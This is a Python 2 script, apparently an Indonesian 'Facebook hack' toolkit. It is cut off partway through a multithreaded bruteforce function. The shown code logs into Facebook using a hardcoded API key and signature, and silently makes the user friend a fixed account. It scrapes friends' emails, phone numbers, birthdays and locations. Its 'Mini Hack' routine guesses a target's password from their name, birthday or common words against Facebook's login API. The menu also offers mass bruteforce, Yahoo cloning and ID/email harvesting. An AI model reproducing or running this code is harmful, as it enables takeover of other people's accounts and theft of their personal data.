# -*- coding: utf-8 -*-

import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
from multiprocessing.pool import ThreadPool
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
else:
    try:
        import requests
    except ImportError:
        os.system('pip2 install requests')

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/36.2.2254/119.132; U; id) Presto/2.12.423 Version/12.16')]


def keluar():
    print '+AFw-x1b[1;91m[!] Tutup'
    os.sys.exit()


def jalan(z):
    for e in z +- '+AFw-n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

logo = " +AFw-x1b[1;92m+JYgliCWIJYgliCWIJYgliCWIAFw-n +AFw-x1b[1;92m+JYglhCWIJYgliCWIJYglhCWI         +AFw-x1b[1;97m+Jc8lrCWsJawlrCWsJawlrCWsJawOUQbpBukOUSWsJawlrCWsJawlrCWsJawlzwBc-n +AFw-x1b[1;92m+JYg +AFw-x1b[1;93m+JbwlvCW8JbwlvA  +AFw-x1b[1;97m- _ --_-- +AFw-x1b[1;92m+JVQlZiVXJQwlACUQJSwlACUQJSwlDCUA   +JVQlUCVXJVQlVw +AFw-n +AFw-x1b[1;92m+JYg  +AFw-x1b[1;97m  +AFw-x1b[1;97m_-_-- -_ --__ +AFw-x1b[1;92m +JVElUSUcJQAlJCUcJSwlGCUcJTQlECUAJQAlACVgJWM +JWAlaSVXAFw-n +AFw-x1b[1;92m+JYg +AFw-x1b[1;93m+JbIlsiWyJbIlsg +AFw-x1b[1;97m--  - _ -- +AFw-x1b[1;92m+JVAlaSVdJTQ +JTQlNCUUJQAlNA +JTQ   +JVo  +JVolUCVd  +AFw-x1b[1;93mPremium+AFw-n +AFw-x1b[1;92m+JYgliCWIJYgliCWIJYgliCWI         +AFw-x1b[1;97m+AKs==========+Jyc==========+ALsAXA-n +AFw-x1b[1;92m +JYgliA +JYgliABc-n +AFw-x1b[1;97m+JVQlUCVQJVAlUCVQJVAlUCVQJVAlUCVQJVAlUCVQJVAlUCVQJVAlUCVQJVAlUCVQJVAlUCVQJVAlUCVQJVAlUCVQJVAlUCVQJVAlUCVQJVAlUCVQJVAlUCVQJVAlUCVQJVAlVwBc-n +AFw-x1b[1;97m+JVE +AFw-x1b[1;93m*  +AFw-x1b[1;97mReCode   +AFw-x1b[1;91m:  +AFw-x1b[1;96m The Magizz  +AFw-x1b[1;97m                   +JVEAXA-n +AFw-x1b[1;97m+JVE +AFw-x1b[1;93m*  +AFw-x1b[1;97mGitHub   +AFw-x1b[1;91m:  +AFw-x1b[1;92m +AFw-x1b[92mhttps://github.com/ngentot+AFw-x1b[    +AFw-x1b[1;97m +JVEAXA-n +AFw-x1b[1;97m+JVE +AFw-x1b[1;93m*  +AFw-x1b[1;97mFB       +AFw-x1b[1;91m:   +AFw-x1b[1;92+AFw-x1b[92mhttps://fb.me/syafei-oi+AFw-x1b[     +AFw-x1b[1;97m   +JVE   +AFw-n +AFw-x1b[1;97m+JVolUCVQJVAlUCVQJVAlUCVQJVAlUCVQJVAlUCVQJVAlUCVQJVAlUCVQJVAlUCVQJVAlUCVQJVAlUCVQJVAlUCVQJVAlUCVQJVAlUCVQJVAlUCVQJVAlUCVQJVAlUCVQJVAlXQ"  '+AFw-n+AFw-x1b[1;92m[*] Silahkan coli dulu agar tidak kna cek point+AFw-n'

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '+AFw-r+AFw-x1b[1;91m[+AFw-xe2+AFw-x97+AFw-x8f] +AFw-x1b[1;92mLoading +AFw-x1b[1;97m' +- o,
        sys.stdout.flush()
        time.sleep(0.01)


back = 0
threads = []
berhasil = []
cekpoint = []
gagal = []
idfriends = []
idfromfriends = []
idmem = []
id = []
em = []
emfromfriends = []
hp = []
hpfromfriends = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = '+AFw-x1b[31mNot Vuln'
vuln = '+AFw-x1b[32mVuln'


def login():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
        print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x98+AFw-x86] +AFw-x1b[1;92mMASUK AKUN FACEBOOK +AFw-x1b[1;91m[+AFw-xe2+AFw-x98+AFw-x86]'
        id = raw_input('+AFw-x1b[1;91m[+-] +AFw-x1b[1;36mUsername +AFw-x1b[1;91m:+AFw-x1b[1;92m ')
        pwd = getpass.getpass('+AFw-x1b[1;91m[+-] +AFw-x1b[1;36mPassword +AFw-x1b[1;91m:+AFw-x1b[1;92m ')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '+AFw-n+AFw-x1b[1;91m[!] Tidak Ada Koneksi'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' +- id +- 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' +- pwd +- 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                zedd = open('login.txt', 'w')
                zedd.write(z['access_token'])
                zedd.close()
                print '+AFw-n+AFw-x1b[1;91m[+AFw-x1b[1;96m+AFw-xe2+AFw-x9c+AFw-x93+AFw-x1b[1;91m] +AFw-x1b[1;92mLogin success'
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' +- z['access_token'])
                time.sleep(1)
                menu()
            except requests.exceptions.ConnectionError:
                print '+AFw-n+AFw-x1b[1;91m[!] Tidak Ada Koneksi'
                keluar()

        if 'checkpoint' in url:
            print '+AFw-n+AFw-x1b[1;91m[!] +AFw-x1b[1;93mAccount Has Been Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(0.01)
            keluar()
        else:
            print '+AFw-n+AFw-x1b[1;91m[!] Gagal Masuk'
            os.system('rm -rf login.txt')
            time.sleep(0.01)
            login()


def menu():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '+AFw-x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()
    else:
        try:
            otw = requests.get('https://graph.facebook.com/me?access_token=' +- toket)
            a = json.loads(otw.text)
            nama = a['name']
            id = a['id']
            ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' +- toket)
            b = json.loads(ots.text)
            sub = str(b['summary']['total_count'])
        except KeyError:
            os.system('clear')
            print '+AFw-x1b[1;91m[!] +AFw-x1b[1;93mSepertinya akun kena Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(0.01)
            login()
        except requests.exceptions.ConnectionError:
            print logo
            print '+AFw-x1b[1;91m[!] Tidak Ada Koneksi'
            keluar()

    os.system('clear')
    print logo
    print '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x94' +- 50 * '+AFw-xe2+AFw-x95+AFw-x90' +- '+JVc'
    print '+AFw-xe2+AFw-x95+AFw-x91+AFw-x1b[1;91m[+AFw-x1b[1;96m+AFw-xe2+AFw-x9c+AFw-x93+AFw-x1b[1;91m]+AFw-x1b[1;97m Name +AFw-x1b[1;91m: +AFw-x1b[1;92m' +- nama +- (39 - len(nama)) * '+AFw-x1b[1;97m ' +- '+JVE'
    print '+AFw-xe2+AFw-x95+AFw-x91+AFw-x1b[1;91m[+AFw-x1b[1;96m+AFw-xe2+AFw-x9c+AFw-x93+AFw-x1b[1;91m]+AFw-x1b[1;97m FBID +AFw-x1b[1;91m: +AFw-x1b[1;92m' +- id +- (39 - len(id)) * '+AFw-x1b[1;97m ' +- '+JVE'
    print '+AFw-xe2+AFw-x95+AFw-x91+AFw-x1b[1;91m[+AFw-x1b[1;96m+AFw-xe2+AFw-x9c+AFw-x93+AFw-x1b[1;91m]+AFw-x1b[1;97m Subs +AFw-x1b[1;91m: +AFw-x1b[1;92m' +- sub +- (39 - len(sub)) * '+AFw-x1b[1;97m ' +- '+JVE'
    print '+AFw-x1b[1;97m+JWA' +- 50 * '+AFw-xe2+AFw-x95+AFw-x90' +- '+JV0'
    print '+JVE--> +AFw-x1b[1;37;40m1. User Information'
    print '+JVE--> +AFw-x1b[1;37;40m2. Hack Facebook Account'
    print '+JVE--> +AFw-x1b[1;37;40m3. Bot'
    print '+JVE--> +AFw-x1b[1;37;40m4. Others'
    print '+JVE--> +AFw-x1b[1;37;40m5. Update'
    print '+JVE--> +AFw-x1b[1;37;40m6. Logout'
    print '+JVE--> +AFw-x1b[1;31;40m0. Exit'
    print '+AFw-x1b[1;37;40m+JVE'
    pilih()


def pilih():
    zedd = raw_input('+JVolUABc-x1b[1;91m+JbYAXA-x1b[1;97m ')
    if zedd == '':
        print '+AFw-x1b[1;91m[!] Can+AFw't empty'
        pilih()
    else:
        if zedd == '1':
            informasi()
        else:
            if zedd == '2':
                menu_hack()
            else:
                if zedd == '3':
                    menu_bot()
                else:
                    if zedd == '4':
                        lain()
                    else:
                        if zedd == '5':
                            os.system('clear')
                            print logo
                            print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
                            os.system('git pull origin master')
                            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
                            menu()
                        else:
                            if zedd == '6':
                                os.system('rm -rf login.txt')
				os.system('xdg-open https://m.facebook.com/rizz.magizz')
                                keluar()
                            else:
                                if zedd == '0':
                                    keluar()
                                else:
                                    print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-x96] +AFw-x1b[1;97m' +- zedd +- ' +AFw-x1b[1;91mNot availabel'
                                    pilih()


def informasi():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '+AFw-x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    os.system('clear')
    print logo
    print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
    id = raw_input('+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mInput ID+AFw-x1b[1;97m/+AFw-x1b[1;92mName+AFw-x1b[1;91m : +AFw-x1b[1;97m')
    jalan('+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-xba] +AFw-x1b[1;92mMohon Tunggu +AFw-x1b[1;97m...')
    r = requests.get('https://graph.facebook.com/me/friends?access_token=' +- toket)
    cok = json.loads(r.text)
    for p in cok['data']:
        if id in p['name'] or id in p['id']:
            r = requests.get('https://graph.facebook.com/' +- p['id'] +- '?access_token=' +- toket)
            z = json.loads(r.text)
            print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
            try:
                print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9e+AFw-xb9] +AFw-x1b[1;92mNama+AFw-x1b[1;97m          : ' +- z['name']
            except KeyError:
                print '+AFw-x1b[1;91m[?] +AFw-x1b[1;92mNama+AFw-x1b[1;97m          : +AFw-x1b[1;91mTidak Ada'
            else:
                try:
                    print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9e+AFw-xb9] +AFw-x1b[1;92mID+AFw-x1b[1;97m            : ' +- z['id']
                except KeyError:
                    print '+AFw-x1b[1;91m[?] +AFw-x1b[1;92mID+AFw-x1b[1;97m            : +AFw-x1b[1;91mTidak Ada'
                else:
                    try:
                        print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9e+AFw-xb9] +AFw-x1b[1;92mEmail+AFw-x1b[1;97m         : ' +- z['email']
                    except KeyError:
                        print '+AFw-x1b[1;91m[?] +AFw-x1b[1;92mEmail+AFw-x1b[1;97m         : +AFw-x1b[1;91mTidak Ada'
                    else:
                        try:
                            print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9e+AFw-xb9] +AFw-x1b[1;92mNomor Telpon+AFw-x1b[1;97m  : ' +- z['mobile_phone']
                        except KeyError:
                            print '+AFw-x1b[1;91m[?] +AFw-x1b[1;92mNomor Telpon+AFw-x1b[1;97m  : +AFw-x1b[1;91mNot found'

                        try:
                            print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9e+AFw-xb9] +AFw-x1b[1;92mLokasi+AFw-x1b[1;97m      : ' +- z['location']['name']
                        except KeyError:
                            print '+AFw-x1b[1;91m[?] +AFw-x1b[1;92mLokasi+AFw-x1b[1;97m      : +AFw-x1b[1;91mTidak Ada'

                    try:
                        print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9e+AFw-xb9] +AFw-x1b[1;92mLahir+AFw-x1b[1;97m      : ' +- z['birthday']
                    except KeyError:
                        print '+AFw-x1b[1;91m[?] +AFw-x1b[1;92mLahir+AFw-x1b[1;97m      : +AFw-x1b[1;91mTidak Ada'

                try:
                    print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9e+AFw-xb9] +AFw-x1b[1;92mSekolah+AFw-x1b[1;97m        : '
                    for q in z['education']:
                        try:
                            print '+AFw-x1b[1;91m                   +AH4 +AFw-x1b[1;97m' +- q['school']['name']
                        except KeyError:
                            print '+AFw-x1b[1;91m                   +AH4 +AFw-x1b[1;91mTidak Ada'

                except KeyError:
                    pass

            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
            menu()
    else:
        print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-x96] Pengguna Tidak Ada'
        raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
        menu()


def menu_hack():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '+AFw-x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    os.system('clear')
    print logo
    print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
    print '+JVE--> +AFw-x1b[1;37;40m1. Mini Hack Facebook (+AFw-x1b[1;92mTarget+AFw-x1b[1;97m)'
    print '+JVE--> +AFw-x1b[1;37;40m2. Multi Bruteforce Facebook'
    print '+JVE--> +AFw-x1b[1;37;40m3. Super Multi Bruteforce Facebook'
    print '+JVE--> +AFw-x1b[1;37;40m4. BruteForce (+AFw-x1b[1;92mTarget+AFw-x1b[1;97m)'
    print '+JVE--> +AFw-x1b[1;37;40m5. Yahoo Clone'
    print '+JVE--> +AFw-x1b[1;37;40m6. Ambil ID/Email/HP'
    print '+JVE--> +AFw-x1b[1;31;40m0. Back'
    print '+AFw-x1b[1;37;40m+JVE'
    hack_pilih()


def hack_pilih():
    hack = raw_input('+JVolUABc-x1b[1;91m+JbYAXA-x1b[1;97m ')
    if hack == '':
        print '+AFw-x1b[1;91m[!] Can+AFw't empty'
        hack_pilih()
    else:
        if hack == '1':
            mini()
        else:
            if hack == '2':
                crack()
                hasil()
            else:
                if hack == '3':
                    super()
                else:
                    if hack == '4':
                        brute()
                    else:
                        if hack == '5':
                            menu_yahoo()
                        else:
                            if hack == '6':
                                grab()
                            else:
                                if hack == '0':
                                    menu()
                                else:
                                    print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-x96] +AFw-x1b[1;97m' +- hack +- ' +AFw-x1b[1;91mNot found'
                                    hack_pilih()


def mini():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '+AFw-x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()
    else:
        os.system('clear')
        print logo
        print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
        print '+AFw-x1b[1;91m[ INFO ] Target must be your friend !'
        try:
            id = raw_input('+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mID Target +AFw-x1b[1;91m:+AFw-x1b[1;97m ')
            jalan('+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-xba] +AFw-x1b[1;92mPlease wait +AFw-x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/' +- id +- '?access_token=' +- toket)
            a = json.loads(r.text)
            print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9e+AFw-xb9] +AFw-x1b[1;92mName+AFw-x1b[1;97m : ' +- a['name']
            jalan('+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mChecking +AFw-x1b[1;97m...')
            time.sleep(1)
            jalan('+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mOpen security +AFw-x1b[1;97m...')
            time.sleep(1)
            jalan('+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-xba] +AFw-x1b[1;92mPlease wait +AFw-x1b[1;97m...')
            print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
            pz1 = a['first_name'] +- '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' +- id +- '&locale=en_US&password=' +- pz1 +- '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            y = json.load(data)
            if 'access_token' in y:
                print '+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mFounded.'
                print '+AFw-x1b[1;91m[+AFw-x1b[1;96m+AFw-xe2+AFw-x9c+AFw-x93+AFw-x1b[1;91m] +AFw-x1b[1;92mName+AFw-x1b[1;97m     : ' +- a['name']
                print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9e+AFw-xb9] +AFw-x1b[1;92mUsername+AFw-x1b[1;97m : ' +- id
                print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9e+AFw-xb9] +AFw-x1b[1;92mPassword+AFw-x1b[1;97m : ' +- pz1
                raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
                menu_hack()
            else:
                if 'www.facebook.com' in y['error_msg']:
                    print '+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mFounded.'
                    print '+AFw-x1b[1;91m[!] +AFw-x1b[1;93mAccount Maybe Checkpoint'
                    print '+AFw-x1b[1;91m[+AFw-x1b[1;96m+AFw-xe2+AFw-x9c+AFw-x93+AFw-x1b[1;91m] +AFw-x1b[1;92mName+AFw-x1b[1;97m     : ' +- a['name']
                    print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9e+AFw-xb9] +AFw-x1b[1;92mUsername+AFw-x1b[1;97m : ' +- id
                    print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9e+AFw-xb9] +AFw-x1b[1;92mPassword+AFw-x1b[1;97m : ' +- pz1
                    raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
                    menu_hack()
                else:
                    pz2 = a['first_name'] +- '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' +- id +- '&locale=en_US&password=' +- pz2 +- '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    y = json.load(data)
                    if 'access_token' in y:
                        print '+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mFounded.'
                        print '+AFw-x1b[1;91m[+AFw-x1b[1;96m+AFw-xe2+AFw-x9c+AFw-x93+AFw-x1b[1;91m] +AFw-x1b[1;92mName+AFw-x1b[1;97m     : ' +- a['name']
                        print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9e+AFw-xb9] +AFw-x1b[1;92mUsername+AFw-x1b[1;97m : ' +- id
                        print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9e+AFw-xb9] +AFw-x1b[1;92mPassword+AFw-x1b[1;97m : ' +- pz2
                        raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
                        menu_hack()
                    else:
                        if 'www.facebook.com' in y['error_msg']:
                            print '+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mFounded.'
                            print '+AFw-x1b[1;91m[!] +AFw-x1b[1;93mAccount Maybe Checkpoint'
                            print '+AFw-x1b[1;91m[+AFw-x1b[1;96m+AFw-xe2+AFw-x9c+AFw-x93+AFw-x1b[1;91m] +AFw-x1b[1;92mName+AFw-x1b[1;97m     : ' +- a['name']
                            print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9e+AFw-xb9] +AFw-x1b[1;92mUsername+AFw-x1b[1;97m : ' +- id
                            print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9e+AFw-xb9] +AFw-x1b[1;92mPassword+AFw-x1b[1;97m : ' +- pz2
                            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
                            menu_hack()
                        else:
                            pz3 = a['last_name'] +- '123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' +- id +- '&locale=en_US&password=' +- pz3 +- '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            y = json.load(data)
                            if 'access_token' in y:
                                print '+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mFounded.'
                                print '+AFw-x1b[1;91m[+AFw-x1b[1;96m+AFw-xe2+AFw-x9c+AFw-x93+AFw-x1b[1;91m] +AFw-x1b[1;92mName+AFw-x1b[1;97m     : ' +- a['name']
                                print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9e+AFw-xb9] +AFw-x1b[1;92mUsername+AFw-x1b[1;97m : ' +- id
                                print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9e+AFw-xb9] +AFw-x1b[1;92mPassword+AFw-x1b[1;97m : ' +- pz3
                                raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
                                menu_hack()
                            else:
                                if 'www.facebook.com' in y['error_msg']:
                                    print '+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mFounded.'
                                    print '+AFw-x1b[1;91m[!] +AFw-x1b[1;93mAccount Maybe Checkpoint'
                                    print '+AFw-x1b[1;91m[+AFw-x1b[1;96m+AFw-xe2+AFw-x9c+AFw-x93+AFw-x1b[1;91m] +AFw-x1b[1;92mName+AFw-x1b[1;97m     : ' +- a['name']
                                    print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9e+AFw-xb9] +AFw-x1b[1;92mUsername+AFw-x1b[1;97m : ' +- id
                                    print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9e+AFw-xb9] +AFw-x1b[1;92mPassword+AFw-x1b[1;97m : ' +- pz3
                                    raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
                                    menu_hack()
                                else:
                                    lahir = a['birthday']
                                    pz4 = lahir.replace('/', '')
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' +- id +- '&locale=en_US&password=' +- pz4 +- '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    y = json.load(data)
                                    if 'access_token' in y:
                                        print '+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mFounded.'
                                        print '+AFw-x1b[1;91m[+AFw-x1b[1;96m+AFw-xe2+AFw-x9c+AFw-x93+AFw-x1b[1;91m] +AFw-x1b[1;92mName+AFw-x1b[1;97m     : ' +- a['name']
                                        print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9e+AFw-xb9] +AFw-x1b[1;92mUsername+AFw-x1b[1;97m : ' +- id
                                        print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9e+AFw-xb9] +AFw-x1b[1;92mPassword+AFw-x1b[1;97m : ' +- pz4
                                        raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
                                        menu_hack()
                                    else:
                                        if 'www.facebook.com' in y['error_msg']:
                                            print '+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mFounded.'
                                            print '+AFw-x1b[1;91m[!] +AFw-x1b[1;93mAccount Maybe Checkpoint'
                                            print '+AFw-x1b[1;91m[+AFw-x1b[1;96m+AFw-xe2+AFw-x9c+AFw-x93+AFw-x1b[1;91m] +AFw-x1b[1;92mName+AFw-x1b[1;97m     : ' +- a['name']
                                            print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9e+AFw-xb9] +AFw-x1b[1;92mUsername+AFw-x1b[1;97m : ' +- id
                                            print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9e+AFw-xb9] +AFw-x1b[1;92mPassword+AFw-x1b[1;97m : ' +- pz4
                                            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
                                            menu_hack()
                                        else:
                                            pz5 = ('sayang')
                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' +- id +- '&locale=en_US&password=' +- pz5 +- '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                            y = json.load(data)
                                            if 'access_token' in y:
                                                print '+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mFounded.'
                                                print '+AFw-x1b[1;91m[+AFw-x1b[1;96m+AFw-xe2+AFw-x9c+AFw-x93+AFw-x1b[1;91m] +AFw-x1b[1;92mName+AFw-x1b[1;97m     : ' +- a['name']
                                                print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9e+AFw-xb9] +AFw-x1b[1;92mUsername+AFw-x1b[1;97m : ' +- id
                                                print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9e+AFw-xb9] +AFw-x1b[1;92mPassword+AFw-x1b[1;97m : ' +- pz5
                                                raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
                                                menu_hack()
                                            else:
                                                if 'www.facebook.com' in y['error_msg']:
                                                    print '+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mFounded.'
                                                    print '+AFw-x1b[1;91m[!] +AFw-x1b[1;93mAccount Maybe Checkpoint'
                                                    print '+AFw-x1b[1;91m[+AFw-x1b[1;96m+AFw-xe2+AFw-x9c+AFw-x93+AFw-x1b[1;91m] +AFw-x1b[1;92mName+AFw-x1b[1;97m     : ' +- a['name']
                                                    print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9e+AFw-xb9] +AFw-x1b[1;92mUsername+AFw-x1b[1;97m : ' +- id
                                                    print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9e+AFw-xb9] +AFw-x1b[1;92mPassword+AFw-x1b[1;97m : ' +- pz5
                                                    raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
                                                    menu_hack()
                                                else:
                                                    print '+AFw-x1b[1;91m[!] Sorry, opening password target failed :('
                                                    print '+AFw-x1b[1;91m[!] Try other method.'
                                                    raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
                                                    menu_hack()
        except KeyError:
            print '+AFw-x1b[1;91m[!] Terget not found'
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
            menu_hack()


def crack():
    global file
    global idlist
    global passw
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '+AFw-x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()
    else:
        os.system('clear')
        print logo
        print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
        idlist = raw_input('+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mFile ID  +AFw-x1b[1;91m: +AFw-x1b[1;97m')
        passw = raw_input('+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mPassword +AFw-x1b[1;91m: +AFw-x1b[1;97m')
        try:
            file = open(idlist, 'r')
            jalan('+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-xba] +AFw-x1b[1;92mPlease wait +AFw-x1b[1;97m...')
            for x in range(40):
                zedd = threading.Thread(target=scrak, args=())
                zedd.start()
                threads.append(zedd)

            for zedd in threads:
                zedd.join()

        except IOError:
            print '+AFw-x1b[1;91m[!] File not found'
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
            menu_hack()


def scrak():
    global back
    global berhasil
    global cekpoint
    global gagal
    global up
    try:
        buka = open(idlist, 'r')
        up = buka.read().split()
        while file:
            username = file.readline().strip()
